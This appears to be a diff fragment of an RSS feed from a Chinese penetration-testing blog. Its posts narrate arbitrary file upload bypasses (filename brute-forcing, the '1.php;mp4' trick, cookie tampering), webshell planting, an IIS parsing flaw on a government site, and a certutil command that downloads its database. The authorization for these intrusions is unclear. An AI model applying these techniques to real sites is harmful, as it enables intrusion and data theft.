+经过长时间的测试，uploadUserNo参数中加上//会导致报错，可以看到文件真实路径(getshell后发现uploadUserNo参数的值会和文件名进行拼接，例如：uploadUserNo参数值为dd//时，文件名为：dd//_年月日时分秒四位随机数_上传文件名，因为文件名不允许有//等特殊字符，所以会报错)。
+此时知道文件目录为TempFile，文件名随机重命名，能够看到其命名规则为【_年月日时分秒四位随机数_上传文件名】
+&lt;img src=&#34;https://360rce.github.io/p/iqi0ucr4/3.png&#34;
+	width=&#34;1755&#34;
+	height=&#34;655&#34;
+	srcset=&#34;https://360rce.github.io/p/iqi0ucr4/3_hu2a16202eaaf7cc8cac1e5a0ddb73d9ed_131004_480x0_resize_box_3.png 480w, https://360rce.github.io/p/iqi0ucr4/3_hu2a16202eaaf7cc8cac1e5a0ddb73d9ed_131004_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;20191127记一次任意文件上传&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;267&#34;
+		data-flex-basis=&#34;643px&#34;
+	
+&gt;
+与电脑时间同步上传，可能秒数会有偏差，假设为偏差间隔为3秒，加上四位随机数字。
+重新上传一次文件，记录上传时间为：“2019年11月27日16时19分11秒”。然后构造数据包进行爆破。
+&lt;img src=&#34;https://360rce.github.io/p/iqi0ucr4/4.png&#34;
+	width=&#34;1104&#34;
+	height=&#34;261&#34;
+	srcset=&#34;https://360rce.github.io/p/iqi0ucr4/4_huf5f991827c65aca94aa1d9bc5468d195_72753_480x0_resize_box_3.png 480w, https://360rce.github.io/p/iqi0ucr4/4_huf5f991827c65aca94aa1d9bc5468d195_72753_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;20191127记一次任意文件上传&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;422&#34;
+		data-flex-basis=&#34;1015px&#34;
+	
+&gt;
+设置第一个标志位
+&lt;img src=&#34;https://360rce.github.io/p/iqi0ucr4/5.png&#34;
+	width=&#34;510&#34;
+	height=&#34;484&#34;
+	srcset=&#34;https://360rce.github.io/p/iqi0ucr4/5_hua64ba2815bbe56ae3cdc5039351a8a2d_14486_480x0_resize_box_3.png 480w, https://360rce.github.io/p/iqi0ucr4/5_hua64ba2815bbe56ae3cdc5039351a8a2d_14486_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;20191127记一次任意文件上传&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;105&#34;
+		data-flex-basis=&#34;252px&#34;
+	
+&gt;
+设置第二个标志位加载生成的0000-9999的4位数字典
+&lt;img src=&#34;https://360rce.github.io/p/iqi0ucr4/6.png&#34;
+	width=&#34;496&#34;
+	height=&#34;426&#34;
+	srcset=&#34;https://360rce.github.io/p/iqi0ucr4/6_hu563fae71ab5c72562e788755ed688927_15634_480x0_resize_box_3.png 480w, https://360rce.github.io/p/iqi0ucr4/6_hu563fae71ab5c72562e788755ed688927_15634_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;20191127记一次任意文件上传&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;116&#34;
+		data-flex-basis=&#34;279px&#34;
+	
+&gt;
+经过一段时间后爆破成功。
+&lt;img src=&#34;https://360rce.github.io/p/iqi0ucr4/7.png&#34;
+	width=&#34;784&#34;
+	height=&#34;571&#34;
+	srcset=&#34;https://360rce.github.io/p/iqi0ucr4/7_hue938307fd91c1bf66adb5f7fa70e5277_100010_480x0_resize_box_3.png 480w, https://360rce.github.io/p/iqi0ucr4/7_hue938307fd91c1bf66adb5f7fa70e5277_100010_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;20191127记一次任意文件上传&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;137&#34;
+		data-flex-basis=&#34;329px&#34;
+	
+&gt;
+访问会报错，但问题不大，拿shell客户端直接连接
+&lt;img src=&#34;https://360rce.github.io/p/iqi0ucr4/8.png&#34;
+	width=&#34;1256&#34;
+	height=&#34;758&#34;
+	srcset=&#34;https://360rce.github.io/p/iqi0ucr4/8_hu3b5a035245c1563482b2c6e13deb94ae_35560_480x0_resize_box_3.png 480w, https://360rce.github.io/p/iqi0ucr4/8_hu3b5a035245c1563482b2c6e13deb94ae_35560_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;20191127记一次任意文件上传&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;165&#34;
+		data-flex-basis=&#34;397px&#34;
+	
+&gt;
+Getshell成功
+&lt;img src=&#34;https://360rce.github.io/p/iqi0ucr4/9.png&#34;
+	width=&#34;1549&#34;
+	height=&#34;875&#34;
+	srcset=&#34;https://360rce.github.io/p/iqi0ucr4/9_hud389543b745d56cb5a0816e8d8fb5425_102414_480x0_resize_box_3.png 480w, https://360rce.github.io/p/iqi0ucr4/9_hud389543b745d56cb5a0816e8d8fb5425_102414_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;20191127记一次任意文件上传&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;424px&#34;
+	
+&gt;&lt;/p&gt;</description>
+        </item>
+        <item>
+        <title>记一个奇葩的上传点</title>
+        <link>https://360rce.github.io/p/3dvjkhwx/</link>
+        <pubDate>Wed, 22 Aug 2018 19:08:19 +0000</pubDate>
+        
+        <guid>https://360rce.github.io/p/3dvjkhwx/</guid>
+        <description>&lt;img src="https://w.wallhaven.cc/full/vq/wallhaven-vqex23.jpg" alt="Featured image of post 记一个奇葩的上传点" /&gt;&lt;p&gt;最近一直很忙，V老哥发来一个站，说有一个上传点，问我要不要玩玩，当时太忙，就没去看，等过了几个小时以后，他说还没有突破，然后我叫他把后台和帐号密码发给我试试。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/3dvjkhwx/01.jpg&#34;
+	width=&#34;607&#34;
+	height=&#34;399&#34;
+	srcset=&#34;https://360rce.github.io/p/3dvjkhwx/01_huab465f23297620c7a8d837568eed7dbd_25221_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/3dvjkhwx/01_huab465f23297620c7a8d837568eed7dbd_25221_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一个奇葩的上传点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;152&#34;
+		data-flex-basis=&#34;365px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;先打开后台看看，发现后台还是挺炫酷的。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/3dvjkhwx/02.jpg&#34;
+	width=&#34;1402&#34;
+	height=&#34;896&#34;
+	srcset=&#34;https://360rce.github.io/p/3dvjkhwx/02_hud211b6059b11e2de311fc92969f569c7_69252_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/3dvjkhwx/02_hud211b6059b11e2de311fc92969f569c7_69252_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一个奇葩的上传点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;156&#34;
+		data-flex-basis=&#34;375px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;用帐号密码登录进后台，找到了上传的地方。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/3dvjkhwx/03.jpg&#34;
+	width=&#34;1347&#34;
+	height=&#34;775&#34;
+	srcset=&#34;https://360rce.github.io/p/3dvjkhwx/03_hu48b47f2196bc098c5f24097987712cc8_88415_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/3dvjkhwx/03_hu48b47f2196bc098c5f24097987712cc8_88415_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一个奇葩的上传点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;173&#34;
+		data-flex-basis=&#34;417px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;打开burp，创建一个1.mp4文件，里面写phpinfo代码，然后发送到Repeater模块，点击go，可以发现是能够正常上传的。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/3dvjkhwx/04.jpg&#34;
+	width=&#34;1265&#34;
+	height=&#34;769&#34;
+	srcset=&#34;https://360rce.github.io/p/3dvjkhwx/04_hu6dfc5db9963b3dc313397aaa6aa34290_146230_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/3dvjkhwx/04_hu6dfc5db9963b3dc313397aaa6aa34290_146230_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一个奇葩的上传点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;164&#34;
+		data-flex-basis=&#34;394px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;继续做测试，把文件名改成1.php;mp4&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/3dvjkhwx/05.jpg&#34;
+	width=&#34;1248&#34;
+	height=&#34;779&#34;
+	srcset=&#34;https://360rce.github.io/p/3dvjkhwx/05_hu2d7ad838df5d231c3753f24cec77d799_139245_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/3dvjkhwx/05_hu2d7ad838df5d231c3753f24cec77d799_139245_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一个奇葩的上传点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;160&#34;
+		data-flex-basis=&#34;384px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后访问一下该页面，发现显示的是源码。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/3dvjkhwx/06.jpg&#34;
+	width=&#34;980&#34;
+	height=&#34;132&#34;
+	srcset=&#34;https://360rce.github.io/p/3dvjkhwx/06_huf64123ecb8d3f5160551b828f18dc45c_26906_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/3dvjkhwx/06_huf64123ecb8d3f5160551b828f18dc45c_26906_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一个奇葩的上传点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;742&#34;
+		data-flex-basis=&#34;1781px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;接下来上传了一个1.rar;mp4。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/3dvjkhwx/07.jpg&#34;
+	width=&#34;1264&#34;
+	height=&#34;801&#34;
+	srcset=&#34;https://360rce.github.io/p/3dvjkhwx/07_hu8d8766e6815ccc6c5bd8b02d1be2ac5f_147258_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/3dvjkhwx/07_hu8d8766e6815ccc6c5bd8b02d1be2ac5f_147258_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一个奇葩的上传点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;157&#34;
+		data-flex-basis=&#34;378px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;访问以后是下载该文件，正常人到这一步都会怀疑可能存在解析漏洞，但是该文件夹下面没有脚本执行权限。&lt;/p&gt;
+&lt;p&gt;接下来把文件名改成1.php试了下，发现上传回显还是mp4格式。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/3dvjkhwx/08.jpg&#34;
+	width=&#34;1241&#34;
+	height=&#34;318&#34;
+	srcset=&#34;https://360rce.github.io/p/3dvjkhwx/08_huefe7a4f7ae4762a609c74566afe5dd8f_50225_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/3dvjkhwx/08_huefe7a4f7ae4762a609c74566afe5dd8f_50225_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一个奇葩的上传点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;390&#34;
+		data-flex-basis=&#34;936px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;陷入了沉思当中，仔细的看了数据包中的每一个参数，发现Cookie有点猫腻。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/3dvjkhwx/09.jpg&#34;
+	width=&#34;596&#34;
+	height=&#34;67&#34;
+	srcset=&#34;https://360rce.github.io/p/3dvjkhwx/09_hu07ee528a4ff19710b0225c7ca11022e7_10239_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/3dvjkhwx/09_hu07ee528a4ff19710b0225c7ca11022e7_10239_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一个奇葩的上传点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;889&#34;
+		data-flex-basis=&#34;2134px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;于是我把php删除了，然后奇迹发生了。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/3dvjkhwx/10.jpg&#34;
+	width=&#34;1264&#34;
+	height=&#34;809&#34;
+	srcset=&#34;https://360rce.github.io/p/3dvjkhwx/10_hu3dd7552942c271d272888f78e9e1c798_148075_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/3dvjkhwx/10_hu3dd7552942c271d272888f78e9e1c798_148075_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一个奇葩的上传点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;156&#34;
+		data-flex-basis=&#34;374px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;我访问看看，发现可以正常访问的。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/3dvjkhwx/11.jpg&#34;
+	width=&#34;1345&#34;
+	height=&#34;479&#34;
+	srcset=&#34;https://360rce.github.io/p/3dvjkhwx/11_hueed609f35e7ef01165519add3dee45cd_98483_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/3dvjkhwx/11_hueed609f35e7ef01165519add3dee45cd_98483_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一个奇葩的上传点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;280&#34;
+		data-flex-basis=&#34;673px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;于是很激动的发给V哥这个地址，但是他却打不开。。。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/3dvjkhwx/12.jpg&#34;
+	width=&#34;611&#34;
+	height=&#34;440&#34;
+	srcset=&#34;https://360rce.github.io/p/3dvjkhwx/12_hub6c12747aeefd5541671645554f3382f_17422_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/3dvjkhwx/12_hub6c12747aeefd5541671645554f3382f_17422_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一个奇葩的上传点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;138&#34;
+		data-flex-basis=&#34;333px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;至于是什么原因应该是跟那个改了的Cookie有关，最后传了个马上去。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/3dvjkhwx/13.jpg&#34;
+	width=&#34;596&#34;
+	height=&#34;538&#34;
+	srcset=&#34;https://360rce.github.io/p/3dvjkhwx/13_huf58ab2674cac58bd3e4a31f76425810c_25074_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/3dvjkhwx/13_huf58ab2674cac58bd3e4a31f76425810c_25074_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一个奇葩的上传点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;110&#34;
+		data-flex-basis=&#34;265px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;后面的就不写了，我把马丢给V哥以后就不管事了。&lt;/p&gt;</description>
+        </item>
+        <item>
+        <title>一个项目中遇到的奇葩站点</title>
+        <link>https://360rce.github.io/p/mwcslpwe/</link>
+        <pubDate>Wed, 20 Dec 2017 16:27:18 +0000</pubDate>
+        
+        <guid>https://360rce.github.io/p/mwcslpwe/</guid>
+        <description>&lt;img src="https://w.wallhaven.cc/full/2y/wallhaven-2y2g66.jpg" alt="Featured image of post 一个项目中遇到的奇葩站点" /&gt;&lt;p&gt;在做项目的时候遇到的一个gov，因为涉及一些敏感信息，就打重马了。&lt;/p&gt;
+&lt;p&gt;其他站太难搞了，挑个软柿子捏，当看到这个首页时，直觉就告诉我这站一定有问题。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mwcslpwe/01.png&#34;
+	width=&#34;949&#34;
+	height=&#34;467&#34;
+	srcset=&#34;https://360rce.github.io/p/mwcslpwe/01_hu0cd3d40afb9fbce84b0a10de7d7d1041_232297_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mwcslpwe/01_hu0cd3d40afb9fbce84b0a10de7d7d1041_232297_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;一个项目中遇到的奇葩站点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;203&#34;
+		data-flex-basis=&#34;487px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;习惯性的一拿到站就查看robots文件。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mwcslpwe/02.png&#34;
+	width=&#34;527&#34;
+	height=&#34;239&#34;
+	srcset=&#34;https://360rce.github.io/p/mwcslpwe/02_hu0cf07f712b46abc139599cc19b12ccdf_15729_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mwcslpwe/02_hu0cf07f712b46abc139599cc19b12ccdf_15729_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;一个项目中遇到的奇葩站点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;220&#34;
+		data-flex-basis=&#34;529px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;简单的看了下服务器的架构，知道是iis7.5的，于是在该文件后尝试解析漏洞。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mwcslpwe/03.png&#34;
+	width=&#34;1243&#34;
+	height=&#34;135&#34;
+	srcset=&#34;https://360rce.github.io/p/mwcslpwe/03_hu6107a366f493d8330dfbe9eb0eb3d412_28440_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mwcslpwe/03_hu6107a366f493d8330dfbe9eb0eb3d412_28440_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;一个项目中遇到的奇葩站点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;920&#34;
+		data-flex-basis=&#34;2209px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;没有报错，从经验来看，这页面风格确实是执行php脚本的风格。&lt;/p&gt;
+&lt;p&gt;然后在随便找了个图片尝试。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mwcslpwe/04.png&#34;
+	width=&#34;560&#34;
+	height=&#34;243&#34;
+	srcset=&#34;https://360rce.github.io/p/mwcslpwe/04_hu6479a9101e6d0daf726bbf85f6f5afaa_31040_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mwcslpwe/04_hu6479a9101e6d0daf726bbf85f6f5afaa_31040_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;一个项目中遇到的奇葩站点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;230&#34;
+		data-flex-basis=&#34;553px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;猜测是该目录没有执行脚本的权限。&lt;/p&gt;
+&lt;p&gt;这时候本来想找到个上传点上传张图片马，然后尝试拿shell。&lt;/p&gt;
+&lt;p&gt;但此时我有个大胆的想法。将asp以php的方法来执行试试。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mwcslpwe/05.png&#34;
+	width=&#34;1415&#34;
+	height=&#34;536&#34;
+	srcset=&#34;https://360rce.github.io/p/mwcslpwe/05_hue37d01e225c3e42568d24f3fb1e5cbc8_40726_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mwcslpwe/05_hue37d01e225c3e42568d24f3fb1e5cbc8_40726_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;一个项目中遇到的奇葩站点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;263&#34;
+		data-flex-basis=&#34;633px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;报错了，源码也暴露了出来，然后祭出扫描器扫了一波敏感文件，找到了其配置文件。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mwcslpwe/06.png&#34;
+	width=&#34;1272&#34;
+	height=&#34;134&#34;
+	srcset=&#34;https://360rce.github.io/p/mwcslpwe/06_hue51e66af9e7eb0910b168e816819982e_28706_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mwcslpwe/06_hue51e66af9e7eb0910b168e816819982e_28706_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;一个项目中遇到的奇葩站点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;949&#34;
+		data-flex-basis=&#34;2278px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;就这样，数据库路径找到了，当我去访问的时候却出现了意外。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mwcslpwe/07.png&#34;
+	width=&#34;535&#34;
+	height=&#34;252&#34;
+	srcset=&#34;https://360rce.github.io/p/mwcslpwe/07_hud8d41f7aeff8a371c6c1593bf9207386_31670_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mwcslpwe/07_hud8d41f7aeff8a371c6c1593bf9207386_31670_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;一个项目中遇到的奇葩站点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;212&#34;
+		data-flex-basis=&#34;509px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;显示404，这尼玛什么鬼。。。&lt;/p&gt;
+&lt;p&gt;继续在后面加./php尝试，奇迹又出现了。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mwcslpwe/08.png&#34;
+	width=&#34;1797&#34;
+	height=&#34;654&#34;
+	srcset=&#34;https://360rce.github.io/p/mwcslpwe/08_hu578cdb64fc7d0a9f811d0d11bdf4096c_190143_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mwcslpwe/08_hu578cdb64fc7d0a9f811d0d11bdf4096c_190143_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;一个项目中遇到的奇葩站点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;274&#34;
+		data-flex-basis=&#34;659px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这里用win自带的命令将其下载下来。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;certutil -urlcache -split -f http://www.xxx.gov.cn/xxx.mdb/.php&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mwcslpwe/09.png&#34;
+	width=&#34;730&#34;
+	height=&#34;266&#34;
+	srcset=&#34;https://360rce.github.io/p/mwcslpwe/09_huf5c4ba0db32446cd5fdc678f1703f3f8_25249_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mwcslpwe/09_huf5c4ba0db32446cd5fdc678f1703f3f8_25249_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;一个项目中遇到的奇葩站点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;274&#34;
+		data-flex-basis=&#34;658px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;将文件名修改为mdb，然后用破障打开找密码，却发现。。。。里面没密码。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mwcslpwe/10.png&#34;
+	width=&#34;149&#34;
+	height=&#34;96&#34;
+	srcset=&#34;https://360rce.github.io/p/mwcslpwe/10_huf47a51a84820ef628d1e448a8246531f_3048_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mwcslpwe/10_huf47a51a84820ef628d1e448a8246531f_3048_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;一个项目中遇到的奇葩站点&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;155&#34;
+		data-flex-basis=&#34;372px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;算了，利用此方法可以看到很多源代码。60个站点50个有狗，玩个锤子，有洞就不错了。这算个高危吧！！！就不继续深入了。&lt;/p&gt;</description>
+        </item>
+        <item>
+        <title>意外性的发现一套cms的注入漏洞</title>
+        <link>https://360rce.github.io/p/xaef7i9f/</link>
+        <pubDate>Fri, 03 Nov 2017 09:19:25 +0000</pubDate>
+        
+        <guid>https://360rce.github.io/p/xaef7i9f/</guid>
+        <description>&lt;img src="https://w.wallhaven.cc/full/yx/wallhaven-yx9xvg.jpg" alt="Featured image of post 意外性的发现一套cms的注入漏洞" /&gt;&lt;p&gt;事情是这样的，在一个老司机的群里聊天。。。。（是真的开车群）一个朋友说想叫我去检测下他们学校官网。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/01.png&#34;
+	width=&#34;439&#34;
+	height=&#34;362&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/01_hu62b3925b6e8ce009f8ba20e3d7f76e60_32543_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/01_hu62b3925b6e8ce009f8ba20e3d7f76e60_32543_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;121&#34;
+		data-flex-basis=&#34;291px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;我这么菜，还是去看看吧。。。。打开主站&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/02.png&#34;
+	width=&#34;1141&#34;
+	height=&#34;562&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/02_hu1072b3399996b6c3daa47c9917ee1626_450294_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/02_hu1072b3399996b6c3daa47c9917ee1626_450294_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;203&#34;
+		data-flex-basis=&#34;487px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;访问robots.txt文件，是存在的，可以看出是isite的cms（在此之前听都没听过….）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/03.png&#34;
+	width=&#34;243&#34;
+	height=&#34;163&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/03_huf5dfe9f90792663e53bb04c5d992fe67_2639_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/03_huf5dfe9f90792663e53bb04c5d992fe67_2639_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;149&#34;
+		data-flex-basis=&#34;357px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;去百度了下看下有啥公开的漏洞吧&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/04.png&#34;
+	width=&#34;650&#34;
+	height=&#34;845&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/04_huaca76807d494a0a3a60aad588afa92f3_129624_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/04_huaca76807d494a0a3a60aad588afa92f3_129624_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
